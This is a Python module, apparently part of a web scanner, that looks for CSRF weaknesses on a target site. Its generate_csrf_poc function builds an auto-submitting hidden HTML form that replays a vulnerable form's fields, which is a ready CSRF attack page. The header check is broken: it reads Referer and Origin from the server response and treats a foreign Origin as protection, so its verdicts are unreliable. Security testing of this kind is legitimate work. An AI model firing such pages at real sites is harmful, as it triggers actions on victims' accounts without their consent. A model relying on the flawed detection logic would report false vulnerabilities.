import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

def find_forms(target, session=None):
    """Détecte les formulaires sur une page cible, supporte les sessions."""
    print(f"[+] Recherche de formulaires sur {target}...")
    try:
        session = session or requests.Session()
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')

        detected_forms = []
        for form in soup.find_all('form'):
            action = form.attrs.get("action") or target  # Gère les formulaires sans action
            method = form.attrs.get("method", "get").lower()
            inputs = {input_tag.attrs.get("name"): input_tag.attrs.get("value", "") for input_tag in form.find_all("input") if input_tag.attrs.get("name")}

            full_action_url = urljoin(target, action)
            print(f"[+] Formulaire trouvé : {full_action_url} ({method.upper()})")
            detected_forms.append({"action": full_action_url, "method": method, "inputs": inputs})

        return detected_forms
    except requests.exceptions.RequestException as e:
        # print(f"❌ Erreur lors de la requête : {e}\n")
        return []

def check_csrf_protection(form):
    """Vérifie si un formulaire possède un token CSRF."""
    print("[+] Vérification de la protection CSRF...")
    csrf_tokens = ["csrf_token", "token", "_csrf", "authenticity_token"]
    
    has_csrf_protection = any(token in form["inputs"] for token in csrf_tokens)
    print(f"[+] Protection CSRF : {has_csrf_protection}")
    return has_csrf_protection

def check_sensitive_requests(target, session=None):
    """Analyse les requêtes HTTP pour détecter un manque de protection CSRF, supporte les sessions."""
    print(f"[+] Vérification des protections CSRF dans les requêtes HTTP sur {target}...")
    try:
        session = session or requests.Session()
        response = session.get(target, timeout=5)
        referer = response.headers.get("Referer")
        origin = response.headers.get("Origin")

        parsed_target = urlparse(target)
        target_domain = parsed_target.netloc

        if not referer or not origin:
            print(f"[+] Aucune protection CSRF détectée sur {target} (Absence de headers `Referer` et `Origin`)")
            return {"url": target, "csrf_vulnerable": True}
            # print(f"⚠️ Aucune protection CSRF détectée sur {target} (Absence de headers `Referer` et `Origin`)") 
            # return {"url": target, "csrf_vulnerable": True}

        if urlparse(origin).netloc != target_domain:
            print(f"[+] Protection CSRF détectée sur {target} (En-tête Origin valide : {origin})")
            return {"url": target, "csrf_vulnerable": False}
            # print(f"⚠️ Protection CSRF potentiellement faible sur {target} (En-tête Origin invalide : {origin})")
            # return {"url": target, "csrf_vulnerable": True}
            
        return {"url": target, "csrf_vulnerable": False}
    except requests.exceptions.RequestException as e:
        # print(f"❌ Erreur lors de la requête : {e}\n")
        return {}

def generate_csrf_poc(form):
    """Génère une preuve de concept (PoC) pour une vulnérabilité CSRF."""
    print("[+] Génération de la preuve de concept (PoC) CSRF...")
    poc = f"""
        <html>
        <body>
        <form action="{form['action']}" method="{form['method']}">
    """
    for name, value in form['inputs'].items():
        poc += f'            <input type="hidden" name="{name}" value="{value}">\n'
    poc += """
            <input type="submit" value="Submit">
        </form>
        <script>document.forms[0].submit();</script>
        </body>
        </html>
    """
    return poc

def scan_csrf(target, formated_target, session=None):
    """Effectue un scan CSRF sur le site, supporte les sessions."""
    print(f"\n\t==============Scan CSRF sur -->{formated_target}<-- 🔍 ==============\n")

    results = {"forms": [], "requests": []}

    # 1️⃣ Tester les formulaires
    forms = find_forms(target, session)
    if not forms:
        print("[+]XX Aucun formulaire détecté. Ignoré.")
    else:
        print("[+] Test des formulaires pour protection CSRF...")
        for form in forms:
            has_csrf = check_csrf_protection(form)
            if not has_csrf:
                print(f"[+] Formulaire potentiellement vulnérable (pas de CSRF token) : {form['action']}")
                results["forms"].append({"form_action": form["action"], "csrf_protected": False, "poc": generate_csrf_poc(form)})

            if form["method"] == "get":
                print(f"[+]  Le formulaire {form['action']} utilise GET pour une action sensible !")
    
    # 2️⃣ Tester les requêtes HTTP sensibles
    print("[+] Vérification des protections CSRF dans les requêtes HTTP...")
    request_check = check_sensitive_requests(target, session)
    if request_check and request_check["csrf_vulnerable"]:
        results["requests"].append(request_check)
    
    print("\n✅ Scan CSRF terminé.\n")

    return results


